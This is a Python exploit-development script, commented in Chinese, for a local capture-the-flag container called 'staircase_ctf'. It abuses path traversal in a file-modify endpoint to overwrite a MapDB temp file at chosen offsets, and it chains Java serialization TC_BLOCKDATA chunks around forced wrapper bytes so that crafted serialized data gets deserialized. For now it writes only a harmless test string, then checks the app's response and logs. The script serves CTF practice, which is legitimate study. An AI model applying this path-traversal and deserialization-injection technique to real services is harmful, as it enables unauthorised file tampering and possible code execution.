#!/usr/bin/env python3
"""
测试：直接覆盖序列化数据，不关心后面的索引
看看MapDB是先反序列化还是先检查索引
"""
import requests
import base64
import subprocess
import time
import struct

def restart_container():
    subprocess.run("docker stop staircase_ctf", shell=True, capture_output=True)
    subprocess.run("docker rm staircase_ctf", shell=True, capture_output=True)
    subprocess.run("docker run -d --name staircase_ctf -p 8080:8080 staircase:latest", shell=True, capture_output=True)
    time.sleep(5)

def get_mapdb_name():
    result = subprocess.run('docker exec staircase_ctf sh -c "ls /tmp/mapdb*temp | head -1"', 
                           shell=True, capture_output=True, text=True)
    return result.stdout.strip().split('/')[-1]

def create_simple_string_object():
    """创建一个简单的 String 对象序列化数据"""
    payload = bytearray()
    payload += b'\xac\xed\x00\x05'  # Stream header
    payload += b'\x74'  # TC_STRING
    payload += struct.pack('>H', 4)  # string length
    payload += b'test'  # string data
    return bytes(payload)

def write_raw_data(mapdb_name, offset, data):
    """直接写入数据（不经过 modify 接口的 <start>/<end> 包装）"""
    # 这个不行，因为我们必须通过 modify 接口
    # modify 接口会自动添加 <start> 和 <end>
    pass

def write_via_modify(mapdb_name, offset, data):
    """通过 modify 接口写入"""
    url = 'http://localhost:8080'
    mapdb_path = f"../../../tmp/{mapdb_name}"
    
    payload = {
        'fileName': mapdb_path,
        'data': base64.b64encode(data).decode(),
        'offset': offset
    }
    
    return requests.put(f'{url}/files/modify', json=payload, timeout=5)

def main():
    print("Restarting container...")
    restart_container()
    
    mapdb_name = get_mapdb_name()
    print(f"MapDB file: {mapdb_name}")
    
    # 首先验证 icon 正常工作
    url = 'http://localhost:8080'
    resp = requests.get(f'{url}/files/icon', timeout=5)
    print(f"Initial icon check: {resp.status_code}")
    
    # 现在我们需要覆盖 0x100250 处的数据
    # 但 modify 会添加 <start> (7 bytes) 前缀
    # 所以如果我们写入 offset=0x100249，数据会从 0x100250 开始
    
    # 让我们写入一些会产生有效序列化流的数据
    # AC ED 00 05 + 一些简单对象
    
    # 问题：我们只能写 8 bytes 的 DATA
    # 所以我们需要用 TC_BLOCKDATA chain
    
    # 让我们先写一个非常短的 payload 来测试
    # AC ED 00 05 74 00 04 test = stream header + string "test"
    # = 4 + 1 + 2 + 4 = 11 bytes，需要 2 个 chunk
    
    print("\nWriting test payload...")
    
    # Chunk 1: 写入位置 0x100249
    # <start>(7) + [AC ED 00 05 77 0C XX XX](8) + <end>(5)
    # 数据从 0x100250 开始: AC ED 00 05 77 0C XX XX
    # 77 0C = TC_BLOCKDATA with 12 bytes to skip
    chunk1 = b'\xac\xed\x00\x05\x77\x0c\x00\x00'
    resp = write_via_modify(mapdb_name, 0x100249, chunk1)
    print(f"Chunk 1 write: {resp.status_code}")
    
    # 我们需要想清楚这个策略...
    # 每次写入后，文件变成:
    # 0x100249: <start> (3c 73 74 61 72 74 3e)
    # 0x100250: DATA (ac ed 00 05 77 0c 00 00)
    # 0x100258: <end> (3c 65 6e 64 3e)
    
    # 下一次写入在 0x100249 + 20 = 0x10025D
    # 0x10025D: <start>
    # 0x100264: DATA
    # 0x10026C: <end>
    
    # 但我们想让数据连续...
    # TC_BLOCKDATA 77 0C 会跳过 12 bytes
    # 从 0x100258 跳过 12 bytes 到 0x100264
    # 这恰好是下一个 DATA 的开始！
    
    # 继续写更多 chunks...
    # 简单的 String 对象: 74 00 04 t e s t 78 = TC_STRING + len + "test" + TC_ENDBLOCKDATA(?)
    # 不对，TC_STRING 不需要 TC_ENDBLOCKDATA
    
    # 简单测试：只写第一个 chunk，看看会发生什么
    
    print("\nTesting icon read after partial write...")
    resp = requests.get(f'{url}/files/icon', timeout=5)
    print(f"Icon after chunk 1: {resp.status_code}")
    
    # 检查错误日志
    result = subprocess.run('docker logs --tail 10 staircase_ctf', shell=True, capture_output=True, text=True)
    print(f"\nDocker logs:\n{result.stdout}")
    if result.stderr:
        print(f"Stderr:\n{result.stderr}")

if __name__ == "__main__":
    main()
